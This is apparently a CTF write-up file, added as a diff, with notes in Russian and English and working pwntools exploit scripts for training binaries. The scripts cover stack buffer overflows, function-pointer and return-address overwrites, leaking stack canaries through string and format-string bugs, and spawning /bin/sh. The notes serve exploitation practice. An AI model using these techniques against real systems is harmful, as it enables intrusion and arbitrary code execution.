@@ -1,0 +1,357 @@
+write_me_not1
+
+if ( *a1 != '0' && a1[1] != 'x' ) from IDA -> adress
+
+go and ger "root" address 0x400ed7
+___________________
+write_me_not2
+
+same as write_me_not1
+___________________
+fptr2
+
+нужно перетереть указатели на pointer и на arg
+через buf ввод
+
+.bss:0000000000404090 ; char buf[8]
+.bss:0000000000404090 buf             db 2 dup(?)             ; DATA XREF: main+45↑o
+.bss:0000000000404092                 align 8
+.bss:0000000000404098                 public function_pointer
+.bss:0000000000404098 ; void (*function_pointer)(char *)
+.bss:0000000000404098 function_pointer dq ?                   ; DATA XREF: main+17↑w
+.bss:0000000000404098                                         ; main+25↑r ...
+.bss:00000000004040A0                 public function_arg
+.bss:00000000004040A0 ; char *function_arg
+.bss:00000000004040A0 function_arg    dq ?                    ; DATA XREF: main+1E↑r
+
+отправляем 8 байтов, затирая указатели и получая шелл
+
+io = start()
+mysystem = 0x401162
+binsh = 0x404090
+pl  = b''
+pl += b'/bin/sh\x00' -> теперь в буфере /bin/sh;
+pl += p64(mysystem)	;в указатель на функцию отправляем адрес my_system
+pl += p64(binsh) ;аргументом является адрес буфера, где лежит /bin/sh -> получили шелл
+io.send(pl)
+io.interactive()
+___________________
+sequential 
+
+переполнение через get(s1)
+нет ограничения по буферу на ввод переменных v1 v2 v3 - можем перетереть
+
+32 байта буфер потом указатели на функции
+init пишет в CMD
+делаем v1 указывает на init, v2 - на sys
+так мы запишем что-то в CMD, а потом вызовем от этого system
+
+io = start()
+init = 0x4007DF
+sys = 0x4007C7
+pl  = b'_' * 32
+pl += p64(init)
+pl += p64(sys)
+io.sendline(pl) #line - we need \n
+io.sendline('echo')
+io.recvuntil('> ')
+io.sendline('/bin/sh\x00') # writed CMD
+io.sendline('help') #проверяем v2 и help и пролучаем шелл
+io.interactive()
+___________________
+pid-4018-7ffc1efb8000-7ffc1efd9000 
+forenser canary
+
+hexdump -C pid-4018-7ffc1efb8000-7ffc1efd9000 -> какой-то стек видим
+
+нашли: 00 87 4f f0 ea f2 46 7a  -> 1й байт нулевой, остальные рандомные (канарейки повторяются)
+___________________
+perm
+
+важны
+ 
+ для получения флага нужно стать examplesecretguy
+___________________
+doublekill
+
+  char username[40]; // [rsp+0h] [rbp-30h] BYREF
+  char *password_ptr; // [rsp+28h] [rbp-8h]
+
+  fprintf(stderr, "[debug] U: %p P: %p\n", username, password); - парсим строку
+  перезаписываем в password_ptr указатель на win, которая дает флаг
+
+io = start()
+leak = io.recvline().strip().decode()
+leaks = re.findall('U: (\S+) P: (\S+)', leak)
+print(leaks)
+
+stackptr = int(leaks[0][0], 16)
+pl = b'a' * 40
+pl += p64(stackptr+40+8+8)  
+
+	# + 40 - размер массива username, +8 - перезаписываем указатель, +8 - возвращаемся
+	#-0000000000000030 username        db 40 dup(?)
+	#-0000000000000008 password_ptr    dq ?                    ; offset
+	#+0000000000000000  s              db 8 dup(?)
+	#+0000000000000008  r              db 8 dup(?)
+	#+0000000000000010
+
+io.send(pl)
+io.send(p64(0x401182))
+io.interactive()
+___________________
+jumper (task_jumper)
+
+  char v1[264]; // [rsp+0h] [rbp-108h] BYREF
+
+  puts("Enter your login at pwn.spbctf.ru:");
+  read_n(v1, 512LL);
+  return read_flag(v1, &data);
+   
+-0000000000000108 v1              db 264 dup(?)
++0000000000000000  r              db 8 dup(?)
+можем перетереть адрес возврата
+
+.text:00000000004007FB loc_4007FB:                             ; CODE XREF: read_flag+19↑j
+.text:00000000004007FB                 lea     rsi, modes      ; "r"
+.text:0000000000400802                 lea     rdi, filename   ; "flag.txt"
+.text:0000000000400809                 call    _fopen
+
+нам нужен этот адрес 0x4007FB
+ 
+io = start()
+#io.recvuntil('Enter your login at pwn.spbctf.ru:') or sendline (because we need '\n')
+read_flag = 0x4007FB
+pl = b'a'*264
+pl += p64(read_flag)
+io.sendline(pl)
+io.interactive()
+___________________
+simple_surprise_1
+
+переполнить буфер [264] и записать нужный адрес
+нужно перезаписать v2, сменив значение с CAFEBABE на другое
+нужно перезаписать адрес возврата
+
+-0000000000000110 var_110         db 268 dup(?)
+-0000000000000004 v2              dd ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+
+io = start()
+read_flag = 0x4012B9
+pl = b'a'*268
+pl += p64(read_flag) # заполняем s
+pl += p64(read_flag) # адрес возврата на print_flag
+io.sendline(pl)
+io.interactive()
+
+или через возврат после ошибочной проверки:
+read_flag = 0x4012B9
+pl = b'a'*268
+pl += p32(0xcafebabe)
+pl += p64(0xdeadbeef) # rbp
+pl += p64(read_flag) #ret
+io.sendline(pl)
+___________________
+simple_suprprise_2_fixed
+
+srand зависит от времени
+буфер = 44
+
+-0000000000000030 s               db 44 dup(?)
+-0000000000000004 v2              dd ?
++0000000000000000  s              db 8 dup(?) //rbp
++0000000000000008  r              db 8 dup(?)
+
+io = start()
+
+leak = io.recvline().strip().decode()
+print(leak)
+canary = leak.split(' ')[4]
+print(canary)
+
+pl = b''
+pl += b'1' * 44 #trash
+pl += p32(int(canary,16)) #p32 because of 'dd' from stack of func
+pl += p64(0xdeadbeef) #rbp
+pl += p64(0x401260) #ret - here we put addr of print_flag
+io.sendline(pl)
+
+io.interactive()
+
+и мы снова получаем флаг
+___________________
+string_leak
+
+void __cdecl play()
+{
+  char buf[16]; // [rsp+0h] [rbp-20h] BYREF
+  unsigned __int64 canary; // [rsp+18h] [rbp-8h]
+
+  canary = __readfsqword(40u);
+  puts("We can leak canary with a C string!!");
+  while ( 1 )
+  {
+    puts("What is your name?");
+    fflush(stdout);
+    read(0, buf, 0x80uLL);
+    if ( buf[0] == 113 )
+      break;
+    printf("Hello %s !\n", buf);
+  }
+}
+stack of 'play' func
+-0000000000000020 buf             db 24 dup(?)
+-0000000000000008 canary          dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+
+pl = b''
+pl += b'1' * 24 #trash
+pl += b'1' # to change canary value to 1 byte 
+io.send(pl)
+
+We can leak canary with a C string!!
+What is your name?
+Hello 11111111111111111111111119\xff(\xbe5[@Ą\x88\xff\x7f !  -> тут наша канарейка, теперь ее нужно распарсить
+What is your name?
+
+io = start()
+
+pl = b''
+pl += b'a' * 24 #trash (dunno why but numbers here don't work with recvuntil)
+pl += b'A' # to change canary value to this 1 ('A') byte 
+io.send(pl)
+io.recvuntil('Hello aaaaaaaaaaaaaaaaaaaaaaaaA')
+leak = io.recvline()
+canary = leak[:7] #first 7 bytes
+canary = bytes([0]) + canary # get fully canary
+print(hexdump(canary))
+
+pl = b'a' * 24 + canary
+pl += p64(0xdeadbeef) #rbp
+pl += p64(0x4011A2) #ret to flag
+io.send(pl)
+
+io.interactive()
+
+next we input smth (q for example) and we get flag
+___________________
+task_printfer
+
+unsigned __int64 logic()
+{
+  char message[136]; // [rsp+0h] [rbp-90h] BYREF
+  unsigned __int64 canary; // [rsp+88h] [rbp-8h]
+
+  canary = __readfsqword(40u);
+  memset(name, 0, sizeof(name));
+  puts("Say your name:");
+  read_n(name, 256);
+  printf("Welcome, "); здесь ввод форматная строка
+  printf(name);
+  puts("!\nNow enter your message:"); здесь переполнение буфера, изменить адрес возврата
+  read_n(message, 512);
+  puts("Thank you! Your opinion is very important for us!");
+  memset(message, 0, 0x80uLL);
+  return __readfsqword(40u) ^ canary;
+} 
+
+-0000000000000090 message         db 136 dup(?)           ; base 2
+-0000000000000008 canary          dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
+
+канарейку можно получить через стек, через ввод имени - форматная строка
+
+дампим весь стек
+def scan_stack():
+	for i in range(128):
+		io = start()
+		fmt = f'%{i+1}$p'
+		print(fmt)
+		io.sendline(fmt)
+			io.recvline()
+		print(io.recvline())
+	
+у канарейки 1-й байт 0 -> 0x00 
+после канарейки должен быть rbp и ret addr
+-> ищем такие
+
+
+io = start()
+pl = b''
+pl += b'a' * 136 #trash (dunno why but numbers here don't work with recvuntil)
+pl += b'A' # to change canary value to this 1 ('A') byte 
+io.send(pl)
+leak = io.recvline()
+canary = leak[:7] #first 7 bytes
+canary = bytes([0]) + canary # get fully canary
+print(hexdump(canary))
+io.interactive()
+
+io = start()
+pl = b'a' * 136 + canary
+pl += p64(0xdeadbeef) #rbp
+pl += p64(0x400885) #ret to flag
+io.send(pl)
+io.interactive()
+[+] Starting local process '/home/pwn3/Downloads/task_printfer': pid 18774
+%23$p
+b'Welcome, 0x52c5a4cbe7561200!\n'
+[+] Starting local process '/home/pwn3/Downloads/task_printfer': pid 18776
+%24$p
+b'Welcome, 0x7fff7c9e7ab0!\n'
+[+] Starting local process '/home/pwn3/Downloads/task_printfer': pid 18778
+%25$p
+b'Welcome, 0x400a32!\n' -> проверили - это адрес возврата, значит нашли канарейку
+
+%23$p
+
+io = start()
+io.sendline('%23$p') #канарейка здесь
+io.recvline()
+leak = io.recvline().decode()
+print(leak) #получили канарейку b'Welcome, 0x53b7e525eae8ed00!\n'
+leak = re.findall('(0x\S+)!',leak)
+canary = int(leak[0], 16)  # распарсили канарейку
+print(hex(canary)
+
+#changing canary value
+pl = b''
+pl += b'a' * 136 #trash
+pl += p64(canary)
+pl += p64(0xdeadbeef) 
+pl += p64(0x400885) #ret addr
+io.sendline(pl)
+io.interactive()
+
+and we get flag
+___________________
+spooner
+
+похоже на сетевой сервис - socket, bind, listen
+
+unsigned __int64 __fastcall handler(unsigned int a1)
+{
+  int v2; // [rsp+10h] [rbp-A0h]
+  char nptr[10]; // [rsp+16h] [rbp-9Ah] BYREF
+  char v4[136]; // [rsp+20h] [rbp-90h] BYREF
+  unsigned __int64 v5; // [rsp+A8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  send(a1, "Length of data: ", 0x11uLL, 0);
+  read_n(a1, nptr, 10LL);
+  v2 = atoi(nptr);
+  if ( v2 > 0 )
+    read_n(a1, v4, (unsigned int)v2);
+  return __readfsqword(0x28u) ^ v5;
+}
+
+будем брутить канарейку по одному байту
+
+
+
+
+
